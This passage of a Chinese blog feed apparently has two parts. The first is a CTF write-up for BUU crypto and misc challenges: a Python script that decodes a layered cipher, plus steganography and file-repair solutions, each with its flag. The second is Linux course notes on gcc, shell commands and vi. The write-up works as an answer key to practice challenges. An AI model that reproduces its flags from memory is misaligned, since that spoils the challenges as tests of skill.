string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>
keys<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span>

m<span class="token operator">=</span>enc
<span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
    m<span class="token operator">=</span>m<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span>mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
 
m1 <span class="token operator">=</span> <span class="token number">0b011000100110110000110001011011110101100001000110001100010111001001100001001100100100011001100010010101110011001001010110011100000101011000110001011001000110011001010101011011010100001001101001010101000011000100110001011001000101100101000101001101010100111001010110010101100110010001011000010100110101010101011010010110010101001101000110010101100100010001010101010000010011110100111101</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span>a2b_hex<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

m2 <span class="token operator">=</span> <span class="token string">'bl1oXF1ra2FbW2VpV1dfUmBiT11dYE5NVVdXSUZYSFVDUA=='</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span>

m3 <span class="token operator">=</span> <span class="token string">'n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP'</span>
m4<span class="token operator">=</span><span class="token string">''</span>
offset<span class="token operator">=</span><span class="token number">5</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    m4<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m4<span class="token punctuation">)</span>

m5 <span class="token operator">=</span> <span class="token string">'scodfuvmhityhirfuxfuvziiruvigzkyhv'</span>
b<span class="token operator">=</span><span class="token number">7</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> k <span class="token keyword">in</span> m5<span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>output:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">011000100110110000110001011011110101100001000110001100010111001001100001001100100100011001100010010101110011001001010110011100000101011000110001011001000110011001010101011011010100001001101001010101000011000100110001011001000101100101000101001101010100111001010110010101100110010001011000010100110101010101011010010110010101001101000110010101100100010001010101010000010011110100111101
0x626c316f58463172613246625732567056316466556d4269543131645945354e5656645853555a595346564455413d3d
b&#39;bl1oXF1ra2FbW2VpV1dfUmBiT11dYE5NVVdXSUZYSFVDUA&#x3D;&#x3D;&#39;
b&#39;n]h\\]kka[[eiWW_R&#96;bO]]&#96;NMUWWIFXHUCP&#39;
scodfuvmhityhirfuxfuvziiruvigzkyhv
1 : lvhwynofabmrabkynqynosbbknobzsdrao
9 : vhlqinwtajexajminoinwgjjmnwjrgbxaw
21 : xzruknibavstavcknykniovvcnivfoltai
15 : jdbswncxapyvapuwngwnckppuncplktvac
3 : hlvounqpadkzadeunwunqcddenqdxcjzaq
7 : zrxymnujahgpahsmnimnuwhhsnuhtwvpau
23 : tpfmgnklaxqbaxwgnegnkyxxwnkxdyrbak
19 : bjdcongratulationsongettingtheflag
11 : rxzienydalcfalgenuenyqllgnylpqhfay
5 : dbjgqnszafihafyqncqnsmffynsfvmphas
17 : ftpksneharwdarosnmsneurronerjuzdae
25 : pftecnmvazojazqcnkcnmizzqnmzbixjam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag:<code>BJD&#123;bjdcongratulationsongettingtheflag&#125;</code></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="认真你就输了"><a href="#认真你就输了" class="headerlink" title="认真你就输了"></a>认真你就输了</h2><p>解压文档，找一下就找到了flag，charts文件夹下flag：flag{M9eVfi2Pcs&#35;}</p>
<h2 id="你猜我是个啥"><a href="#你猜我是个啥" class="headerlink" title="你猜我是个啥"></a>你猜我是个啥</h2><p>打开压缩包文件报错，16进制看一下，是个png，改后缀，是个二维码，扫描说flag不在这。。。</p>
<p>继续16进制看看，文件底部找到flag:<code>flag&#123;i_am_fl@g&#125;</code></p>
<h2 id="藏藏藏"><a href="#藏藏藏" class="headerlink" title="藏藏藏"></a>藏藏藏</h2><p>给了一张jpg图片，binwalk发现压缩包，foremost解压得到一个文档，打开扫码得到flag:<code>flag&#123;you are the best!&#125;</code></p>
<h2 id="just-a-rar"><a href="#just-a-rar" class="headerlink" title="just_a_rar"></a>just_a_rar</h2><p>4位数密码爆破，得到：2016，解压得到图片，16进制源码得到flag:<code>flag&#123;Wadf_123&#125;</code></p>
<h2 id="一叶障目"><a href="#一叶障目" class="headerlink" title="一叶障目"></a>一叶障目</h2><p>因为我使用的是honeyview查看图片，显示失败，多半是改了png图片的高，010打开，将第二行的01 4C改成03 4C保存，再打开就得到flag:<code>flag&#123;66666&#125;</code></p>
<h2 id="纳尼"><a href="#纳尼" class="headerlink" title="纳尼"></a>纳尼</h2><p>gif文件打不开，多半是16进制源码出问题了，打开看到少了gif的文件头，添加上47 49 46 38后保存，打开看到字符串，记录下来<code>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</code></p>
<p>base64:<code>CTF&#123;wang_bao_qiang_is_sad&#125;</code></p>
<h2 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h2><p>给了两张gif，一个打不开，直接010,看到，第二张少了文件头，加上之后得到<br>flag:<code>flag&#123;zhi_yin_you_are_beautiful&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>BUU</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序设计（一）</title>
    <url>/2020/10/28/linux-cheng-xu-she-ji-yi/</url>
    <content><![CDATA[<p>课程笔记，随便记记</p>
<p>对应PPT 1-2章</p>
<span id="more"></span>
<h1 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h1><h2 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h2><h3 id="An-Introduction-to-UNIX-Linux-and-GNU"><a href="#An-Introduction-to-UNIX-Linux-and-GNU" class="headerlink" title="An Introduction to UNIX, Linux, and GNU"></a>An Introduction to UNIX, Linux, and GNU</h3><p>Unix操作系统最初是由贝尔实验室开发的，当时的贝尔实验室是电信业巨头—-AT&amp;T(美国电报电话公司)旗下的一员。</p>
<p>UNIX是在20世纪70年代为DEC（数字设备公司）的PDP系列计算机开发的。</p>
<h3 id="UNIX-Philosophy"><a href="#UNIX-Philosophy" class="headerlink" title="UNIX Philosophy"></a>UNIX Philosophy</h3><ul>
<li><p>Simplicity(简单性)</p>
</li>
<li><p>Focus(集中性)</p>
</li>
<li><p>Reusable Components(可重用组件)</p>
</li>
<li><p>Filters(过滤器)</p>
</li>
<li><p>Open File Formats(开放的文件格式)</p>
</li>
<li><p>Flexibility(灵活性)</p>
</li>
</ul>
<h3 id="What-Is-Linux"><a href="#What-Is-Linux" class="headerlink" title="What Is Linux?"></a>What Is Linux?</h3><p>Linux是类UNIX内核（操作系统的低级内核）的免费分布式实现。<br>Linux是由赫尔辛基大学的Linus Torvalds在互联网上的UNIX程序员的帮助下开发的。<br>现在，使用许多不同类型的CPU的Linux版本可用于各种计算机系统。</p>
<h3 id="发行版简介"><a href="#发行版简介" class="headerlink" title="发行版简介"></a>发行版简介</h3><p>分发通常在CD-ROM上，它不仅包含内核，还包含许多其他编程工具和实用程序。</p>
<p>发行版通常附带安装程序和附加文档，以帮助您安装自己的Linux系统。</p>
<p>一些著名的发行版（尤其是在Intelx86和奔腾系列处理器上）是Red Hat Linux、SuSE Linux和Debian GNU/Linux。</p>
<h2 id="Linux编程"><a href="#Linux编程" class="headerlink" title="Linux编程"></a>Linux编程</h2><p>Linux系统可以使用大量的编程语言，其中许多语言都是免费的，可以从CD-ROM集合或Internet上的FTP存档站点获得。</p>
<p>下面是Linux程序员可用的编程语言的部分列表：</p>
<p>Ada、 C /C++、Eiffel 、 Forth 、 Fortran、Icon 、 Java JavaScript.</p>
<h3 id="Linux程序"><a href="#Linux程序" class="headerlink" title="Linux程序"></a>Linux程序</h3><p>Linux应用程序由两种特殊类型的文件：可执行文件和脚本。</p>
<ul>
<li><p>可执行文件是可由计算机直接运行的程序；</p>
</li>
<li><p>脚本是另一个程序（解释器）要遵循的指令集合。（脚本文件类似于Windows中的.bat文件、.cmd文件）</p>
</li>
</ul>
<h3 id="C程序"><a href="#C程序" class="headerlink" title="C程序"></a>C程序</h3><p>常用gcc选项</p>
<pre class="line-numbers language-none"><code class="language-none">-ansi        只支持ANSI标准的C语法。
-c           只编译，不连接成为可执行文件。编译器只是由输入的.c等源代码文件生成.o为后缀的目标文件，通常用于编译不包含主程序的子程序文件。
-E           只运行C预编译器。
-g           生成调试信息，GNU调试器可利用该信息。
-S           停止于编译步骤之后，不进行汇编步骤，最后的输出文件类型为汇编源代码文件。GCC 产生的汇编语言文件的缺省扩展名是 .s 。
-O1          让gcc对源代码进行基本优化，这些优化在大多数情况下都会使程序执行得更快。
-O2          让gcc产生尽可能小和尽可能快的代码，-O2选项将使编译的速度比使用-O1时慢，但通常产生的代码执行速度会更快。
-o FILE      确定输出文件的名称为FILE，同时这个名称不能和源文件同名。如果不给出这个选项，gcc就给出系统预设的可执行文件a.out。 
-Wall        生成所有警告信息。
-w           不生成任何警告信息。
-IDIRECTORY  指定额外的头文件搜索路径DIRECTORY。 
-LDIRECTORY  指定额外的函数库搜索路径DIRECTORY。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="开发系统路线图"><a href="#开发系统路线图" class="headerlink" title="开发系统路线图"></a>开发系统路线图</h2><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul>
<li><p>系统提供的用于一般用途的应用程序，包括程序开发，可以在 <code>/usr/bin</code> 中找到。</p>
</li>
<li><p>系统管理员为特定主机或本地网络添加的应用程序通常位于 <code>/usr/local/bin</code> 或 <code>/opt</code> 中。</p>
</li>
<li><p>功能特性和编程系统可能有自己的目录结构和程序目录。</p>
</li>
</ul>
<h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><ul>
<li><p>对于C，它们几乎总是位于 <code>/usr/include</code> 及其子目录中。</p>
</li>
<li><p>其他编程系统也将包括存储在目录中的文件，这些文件由适当的编译器自动搜索。</p>
</li>
<li><p>通过向C编译器指定-I标志，我们可以在子目录或非标准位置使用include文件。例如，</p>
</li>
</ul>
<p><code>$gcc-I/usr/openwin/include fred.c</code></p>
<h3 id="库文件"><a href="#库文件" class="headerlink" title="库文件"></a>库文件</h3><ul>
<li><p>库是为可重用而编写的预编译函数的集合。通常，它们由一组相关函数组成，以执行一个共同的任务。</p>
</li>
<li><p>标准系统库通常存储在 <code>/lib</code> 和 <code>/usr/lib</code> 中。</p>
</li>
<li><p>库文件名总是以lib开头。名称的最后一部分以点开头，并指定库的类型：</p>
<ul>
<li><p>.a用于传统的静态库</p>
</li>
<li><p>.so用于共享库</p>
</li>
</ul>
</li>
</ul>
<h3 id="静态库"><a href="#静态库" class="headerlink" title="静态库"></a>静态库</h3><ul>
<li><p>当程序需要使用存储在库中的函数时，它包含一个声明该函数的头文件。</p>
</li>
<li><p>把程序和链接器结合成一个程序库和一个可执行程序。</p>
</li>
<li><p>静态库，也被称为archives（归档文件）的名称，通常以.a结尾。</p>
</li>
<li><p>我们可以很容易地用我们自己的程序库来创建和维护gcc的静态库。</p>
</li>
</ul>
<h3 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h3><ul>
<li>共享库与静态库存储在相同的位置，但共享库具有不同的文件名后缀。</li>
<li>系统可以安排一个共享库的单个副本同时供多个应用程序使用，并只在磁盘上存储一次。</li>
<li>另一个好处是共享库可以独立于依赖它的应用程序进行更新。</li>
<li>通过运行ldd，我们可以看到程序需要哪些共享库。</li>
</ul>
<h2 id="Linux命令摘要"><a href="#Linux命令摘要" class="headerlink" title="Linux命令摘要"></a>Linux命令摘要</h2><h3 id="Starting-amp-Stopping"><a href="#Starting-amp-Stopping" class="headerlink" title="Starting &amp; Stopping"></a>Starting &amp; Stopping</h3><pre class="line-numbers language-none"><code class="language-none">shutdown -h now   现在关闭系统，不要重新启动
halt              停止所有进程-同上
shutdown -r 5     5分钟后关闭系统并重新启动
shutdown -r now   现在关闭系统并重新启动
reboot            停止所有进程，然后重新启动-同上
startx            启动X系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Files-and-Directory"><a href="#Files-and-Directory" class="headerlink" title="Files and Directory"></a>Files and Directory</h3><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;home          进入目录&#39;&#x2F; home’
cd ..             返回上一级目录
cd                进入根目录
pwd               显示工作目录的路径
ls –l             显示文件和目录的详细信息
mkdir dir1        创建一个名叫&#39;dir1&#39;的
ln –s file1 lnk1  创建指向文件或目录的符号链接（软链接）
ln file1 lnk1     创建指向文件或目录的物理链接
touch –t 0712250000 fileditest
                  修改文件或目录的时间戳-（YYMMDDhhmm）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Finding-files-and-text-within-files"><a href="#Finding-files-and-text-within-files" class="headerlink" title="Finding files and text within files"></a>Finding files and text within files</h3><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name fname          从根目录开始，查找名为fname的文件
find &#x2F; -name “*fname*”      从根目录开始，查找包含字符串fname的文件
locate missingfilename      使用locate命令查找一个名为missingfilename的文件-假设您已经使用了updatedb命令（请参见下一个）
updatedb                    在附加到linux根目录的所有文件系统上创建或更新文件数据库
which missingfilename       显示包含名为missingfilename的可执行文件的子目录
grep textstringtofind &#x2F;dir  从名为dir的目录开始，查找并列出所有包含textstringtofind的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Moving-copying-deleting-amp-viewing-files"><a href="#Moving-copying-deleting-amp-viewing-files" class="headerlink" title="Moving, copying, deleting &amp; viewing files"></a>Moving, copying, deleting &amp; viewing files</h3><pre class="line-numbers language-none"><code class="language-none">ls -l                       使用长格式列出当前目录中的文件
ls -F                       列出当前目录中的文件并指示文件类型
ls -laC                     以长格式列出当前目录中的所有文件，并按列显示
rm name                     删除名为名称的文件或目录
rm -rf name                 杀死整个目录，包括文件和子目录
cp filename &#x2F;home&#x2F;dirname   将名为filename的文件复制到&#x2F;home&#x2F;dirname目录
mv filename &#x2F;home&#x2F;dirname   将名为filename的文件移动到&#x2F;home&#x2F;dirname目录
cat filetoview              显示名为filetoview的文件
man -k keyword              显示包含keyword的手册页
more filetoview             显示名为filetoview一次查看一页的文件，使用空格进入下一页
head filetoview             显示名为filetoview的文件的前10行
head -20 filetoview         显示名为filetoview的文件的前20行
tail filetoview             显示名为filetoview的文件的最后10行
tail -20 filetoview         显示名为filetoview的文件的最后20行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Installing-software-for-Linux"><a href="#Installing-software-for-Linux" class="headerlink" title="Installing software for Linux"></a>Installing software for Linux</h3><pre class="line-numbers language-none"><code class="language-none">rpm -ihv name.rpm      安装名为name的rpm包
rpm -Uhv name.rpm      升级名为name的rpm包
rpm -e package         删除名为package的rpm包
rpm -l package         列出包中名为package的文件
rpm -ql package        列出这些文件并声明包的已安装版本
rpm -i --force package 重新安装名为name的rpm软件包，删除了其中的部分（不是使用rpm-e删除）
tar -zxvf archive.tar.gz or tar -zxvf archive.tgz
	                   解压缩包含压缩文件的存档文件中的文件
.&#x2F;configure            执行脚本，准备要编译的已安装文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="User-Administration"><a href="#User-Administration" class="headerlink" title="User Administration"></a>User Administration</h3><pre class="line-numbers language-none"><code class="language-none">adduser accountname   创建一个名为accountname的新用户
passwd accountname    为帐号命名一个新密码
groupadd group_name   创建一个新组
groupdel group_name   删除群组
su                    从当前登录名以超级用户身份登录
exit                  停止成为超级用户并恢复为普通用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>使用命令 <code>ls -l</code> ，会出现文件权限信息，例如：<code>drwxr-xr-x</code></p>
<p><strong>Read = 4   Write = 2   Execute = 1</strong></p>
<p>通过为每个用户类型提供 <code>chmod</code> 命令和适当的八进制代码，可以更改文件许可权。 例如 <code>chmod 7 6 4 filename</code> 将使文件名为R + W + X的文件名为所有者，R + W为组，其他为R。</p>
<p><code>chmod 7 5 5</code> 拥有者的完全权限，拥有对群组和其他人的读取和执行访问权限。</p>
<p><code>chmod +x filename</code> 使名为filename的文件对所有用户可执行。</p>
<h3 id="Process-Management"><a href="#Process-Management" class="headerlink" title="Process Management"></a>Process Management</h3><pre class="line-numbers language-none"><code class="language-none">ps             显示您当前活动的进程
top            显示所有正在运行的进程
kill pid       杀死进程ID pid
killall proc   杀死所有名为proc的进程
bg             列出已停止或后台作业；在后台恢复已停止的作业
fg             将最新工作带到前台
fg n           将工作n带到前台<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="System-Info"><a href="#System-Info" class="headerlink" title="System Info"></a>System Info</h3><pre class="line-numbers language-none"><code class="language-none">date                显示当前日期和时间 E.G date 041217002007.00
cal                 显示本月的日历
uptime              显示当前正常运行时间
w                   显示在线用户
whoami              显示您的登录身份
finger user         显示用户信息
uname -a            显示内核信息
cat &#x2F;proc&#x2F;cpuinfo   cpu信息
cat &#x2F;proc&#x2F;meminfo   内存信息
man command         显示命令手册
df                  显示磁盘使用情况
du                  显示目录空间使用情况
free                显示内存和交换使用情况
whereis app         显示app的可能位置
which app           显示默认情况下将运行哪个应用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Vi使用指南"><a href="#Vi使用指南" class="headerlink" title="Vi使用指南"></a>Vi使用指南</h2><p>Vi是一个流行的文本编辑器，保证在所有Linux和Unix发行版上都能使用，它非常适合从命令行快速编辑配置文件。</p>
<p>有两种方法可以启动Vi：</p>
<ul>
<li><p>vi—-打开未命名的空白文件。</p>
</li>
<li><p>vi filename—-开始编辑空白命名文档或打开文件进行编辑。</p>
</li>
</ul>
<p>Vi有3种模式：</p>
<ul>
<li>命令模式</li>
<li>插入模式</li>
<li>末行模式</li>
</ul>
<p>Vi以命令模式开始。</p>
<ul>
<li>在命令模式下按 <code>i</code> 进入插入模式。</li>
<li>按 <code>Esc</code> 返回命令模式</li>
<li>按 <code>:</code> 从命令模式到末行模式</li>
</ul>
<h3 id="Insert-Replace-mode"><a href="#Insert-Replace-mode" class="headerlink" title="Insert/Replace mode"></a>Insert/Replace mode</h3><p>像在任何文本编辑器中一样输入。</p>
<h3 id="Command-mode-Last-line-mode"><a href="#Command-mode-Last-line-mode" class="headerlink" title="Command mode/Last-line mode"></a>Command mode/Last-line mode</h3><ol>
<li>保存</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">:w            将已命名的文件写入磁盘
:w filename   保存未命名的文档或使用新的文件名保存文档。 
:w!           覆盖现有文件（而不是正在编辑的文件）所需的文件名。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol>
<li>退出</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">:q    退出Vi，但仅当文档未被修改时
:q!   不保存文档就退出Vi
:wq   保存文档并退出Vi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol>
<li>打开</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">:e filename   打开文件进行编辑，或开始新的命名文档
:r filename   在当前行和下一行之间添加文件filename的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol>
<li>移动</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">[PageUp]    上移1页。在前面加上一个数字可以向上移动那么多页
[PageDn]    下移1页。在前面加一个数字可以向下移动那么多页
gg          移到文档开头
G           移到文档末尾
:n          移动到特定行的开头<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>撤销和重做</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">u         撤消
[Ctrl]r   恢复<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol>
<li>删除（剪切）</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">dd           删除（剪切）当前行
Ndd          删除（剪切）当前行加上下面的n-1行
x or [Del]   删除（剪切）当前字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol>
<li>拖拉（复制）并粘贴</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">yy or Y     拖拉（复制）当前行
nyy or nY   拖拉（复制）当前行和下面的n-1行
p           在当前行和下一行之间粘贴文本
np          在当前行和下一行之间粘贴文本n次
P           在当前行和上一行之间粘贴文本
nP          在当前行和上一行之间粘贴文本，n次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>搜索</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;text   从光标中查找下一个文本实例，其中text是要查找的字符串。如果找不到任何内容，那么Vi将从文档的开始处折回光标
?text   与上面相同，但搜索方向相反
n       下一次出现（在任一方向）
N       上一次发生<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>替换</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">:s&#x2F;old&#x2F;new     用new替换old的下一个实例
:s&#x2F;old&#x2F;new&#x2F;g   用new替换old的所有实例
rcharacter     用字符替换当前字符
nrcharacter    将当前字符加上下一个n-1个字符替换为字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="Debugging-and-Make"><a href="#Debugging-and-Make" class="headerlink" title="Debugging and Make"></a>Debugging and Make</h1><h2 id="错误类型"><a href="#错误类型" class="headerlink" title="错误类型"></a>错误类型</h2><p>功能定义错误：如果程序的功能被错误地定义了，它就肯定不能完成预定的工作。所以，在开始设计之前，你必须确认自己知道并理解这个程序究竟是用来干什么的。</p>
